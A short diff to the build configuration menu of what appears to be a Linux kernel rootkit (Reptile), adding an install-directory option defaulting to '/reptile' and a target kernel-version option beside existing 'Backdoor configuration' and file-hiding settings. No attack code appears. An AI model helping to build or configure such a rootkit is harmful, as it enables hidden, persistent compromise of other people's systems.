@@ -25,6 +25,14 @@ menu "Backdoor configuration"
     comment "END"
 endmenu 
 
+config INSTALL_DIR
+    string "Default install dir"
+    default "/reptile"
+
+config KERNEL_VERSION
+    string "Build for kernel version. Leave empty to use ${uname -r}"
+    default ""
+
 config CONFIG_FILE_TAMPERING
     bool "Hide specific file contents"
     default y
